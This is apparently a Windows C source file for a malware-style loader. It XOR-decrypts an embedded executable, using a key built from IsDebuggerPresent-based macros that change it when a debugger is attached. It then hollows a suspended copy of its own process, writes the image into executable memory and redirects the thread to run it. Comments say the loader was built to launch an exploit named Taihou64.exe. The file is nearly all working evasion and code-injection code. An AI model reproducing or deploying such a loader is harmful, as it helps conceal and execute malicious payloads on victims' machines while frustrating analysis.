#include <Windows.h>
#include <stdio.h>
#include "memory.h"

#define ZERO (IsDebuggerPresent())
#define ONE (ZERO + 1)
#define TWO (ONE << ONE)
#define THREE (TWO | ONE)
#define FOUR (ONE << TWO)
#define FIVE ((ONE << THREE) - THREE)
#define SIX (FIVE + ONE)
#define SEVEN ((ONE << THREE) - ONE)
#define EIGHT (FOUR << ONE)
#define NINE ((FIVE * TWO) - ONE)
#define TEN (NINE + ONE)

// This used to be in a DLL but I had to make it an exe for the exploit
VOID Fail_(ULONG Error, CHAR* Where, INT Line) {
	printf("[!] Failed with error: 0x%lx at %s:%d\n", Error, Where, Line);
	ExitProcess(Error);
}

#define Fail(Error) Fail_(Error, __FUNCTION__, __LINE__);

VOID XorDecrypt(BYTE* Data, BYTE* Out, DWORD Size) {
	for (DWORD i = 0; i < Size; i++) {
		Out[i] = Data[i] ^ ((SIX * TEN) + SIX);
	}
}

VOID PeRun(LPPROCESS_INFORMATION ProcessInformation,
	LPSTARTUPINFO StartupInfo,
	LPVOID ImageBase,
	LPWSTR Argv,
	SIZE_T Argc,
	BOOLEAN NewProc) {

	WCHAR FilePath[MAX_PATH] = { 0 };

	if (!GetModuleFileNameW(NULL, FilePath, sizeof(FilePath))) {
		Fail(ERROR_INSUFFICIENT_BUFFER);
	}

	WCHAR* ArgvBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_PATH + 2048);

	SIZE_T FilePathLength = wcslen(FilePath);
	RtlCopyMemory(ArgvBuffer, FilePath, FilePathLength * sizeof(WCHAR));

	ArgvBuffer[FilePathLength] = ' ';
	RtlCopyMemory(ArgvBuffer + FilePathLength + 1, Argv, Argc);

	PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)ImageBase;
	PIMAGE_NT_HEADERS NtHeader = (PIMAGE_NT_HEADERS)((DWORD64)ImageBase + DosHeader->e_lfanew);

	CONTEXT ProcessContext = { 0 };
	HANDLE ProcessHandle = GetCurrentProcess();

	if (NtHeader->Signature != IMAGE_NT_SIGNATURE) {
		Fail(ERROR_BAD_FORMAT);
	}

	if (NewProc) {
		if (!CreateProcessW(
			NULL,
			ArgvBuffer,
			NULL,
			NULL,
			TRUE,
			CREATE_SUSPENDED,
			NULL,
			NULL,
			StartupInfo,
			ProcessInformation
		))
		{
			Fail(GetLastError());
		}

		ProcessContext.ContextFlags = CONTEXT_FULL;

		if (!GetThreadContext(ProcessInformation->hThread,
			&ProcessContext)) {
			Fail(GetLastError());
			TerminateProcess(ProcessInformation->hProcess, GetLastError());
		}

		ProcessHandle = ProcessInformation->hProcess;
	}

	LPVOID ImageBuffer = VirtualAllocEx(ProcessHandle,
		(LPVOID)NtHeader->OptionalHeader.ImageBase,
		NtHeader->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (!ImageBuffer) {
		Fail(ERROR_NOT_ENOUGH_MEMORY);
		TerminateProcess(ProcessHandle, GetLastError());
	}

	if (!WriteProcessMemory(
		ProcessHandle,
		ImageBuffer,
		ImageBase,
		NtHeader->OptionalHeader.SizeOfHeaders,
		NULL
	)) {
		Fail(ERROR_NOACCESS);
		TerminateProcess(ProcessHandle, GetLastError());
	}

	PIMAGE_SECTION_HEADER HeaderSection = IMAGE_FIRST_SECTION(NtHeader);

	// Dirty hack, Done for Taihou64.exe the exploit used
	for (INT i = 0; i < NtHeader->FileHeader.NumberOfSections; ++i) {
		if (!WriteProcessMemory(
			ProcessHandle,
			(LPVOID)((DWORD64)ImageBuffer + HeaderSection[i].VirtualAddress),
			(LPVOID)((DWORD64)ImageBase + HeaderSection[i].PointerToRawData),
			HeaderSection[i].SizeOfRawData,
			NULL
		)) {
			printf("[!] WARNING Failed to write to address: 0x%llx\n", ((DWORD64)ImageBuffer + HeaderSection[i].VirtualAddress));
//			Fail(GetLastError());
			TerminateProcess(ProcessInformation->hProcess, GetLastError());
		}
	}

	if (NewProc) {
		if (!WriteProcessMemory(
			ProcessHandle,
			(LPVOID)(ProcessContext.Rdx + sizeof(LPVOID) * 2),
			&ImageBuffer,
			sizeof(LPVOID),
			NULL
		)) {
			Fail(ERROR_NOACCESS);
			TerminateProcess(ProcessHandle, GetLastError());
		}

		ProcessContext.Rcx = (ULONG64)(ImageBuffer) + NtHeader->OptionalHeader.AddressOfEntryPoint;

		if (!SetThreadContext(ProcessInformation->hThread,
			&ProcessContext)) {
			Fail(GetLastError());
			TerminateProcess(ProcessHandle, GetLastError());
		}

		if (!ResumeThread(ProcessInformation->hThread)) {
			Fail(GetLastError());
			TerminateProcess(ProcessHandle, GetLastError());
		}
	}
	else {
		VOID(*Entry)(VOID) = (VOID(*)(VOID))((ULONG64)(ImageBuffer) + NtHeader->OptionalHeader.AddressOfEntryPoint);
		Entry();
	}
}

INT main(VOID) {
	BYTE *ProgramDecrypted = malloc(memory_bin_len);
	
	XorDecrypt(memory_bin, ProgramDecrypted, memory_bin_len);
	
	PROCESS_INFORMATION ProcessInformation = { 0 };
	STARTUPINFO StartupInfo = { 0 };
	DWORD ProcessReturnCode = 0;

	PeRun(&ProcessInformation, &StartupInfo, (LPVOID)ProgramDecrypted, L"", 0, TRUE);

	WaitForSingleObject(ProcessInformation.hProcess, INFINITE);
	GetExitCodeProcess(ProcessInformation.hProcess, &ProcessReturnCode);
	return 0;
}